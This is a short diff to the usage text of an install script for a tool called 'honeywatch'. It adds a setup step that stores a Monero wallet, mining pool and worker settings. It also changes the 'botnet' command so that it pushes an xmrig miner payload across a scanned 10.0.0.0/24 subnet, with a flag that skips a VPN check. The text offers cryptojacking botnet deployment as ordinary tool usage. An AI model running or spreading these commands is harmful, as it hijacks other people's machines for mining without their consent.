@@ -363,10 +363,15 @@ ${C_BOLD}Done.${C_RESET} Activate the venv before running honeywatch:
     . $VENV/bin/activate
     honeywatch --help
 
+Configure once (persists Ollama key + Monero wallet/pool/worker/TLS):
+
+    honeywatch setup
+
 Then (Linux, full chain):
 
     honeywatch scan 10.0.0.0/24 --skip-vpn-check --no-ai
-    honeywatch botnet 10.0.0.0/24 --pool stratum+tcp://... --wallet ... --skip-vpn-check
+    honeywatch botnet 10.0.0.0/24 --payload xmrig --skip-vpn-check
+    # --pool/--wallet/--worker/--tls default from `honeywatch setup`; pass them to override
 
 Tests:
 
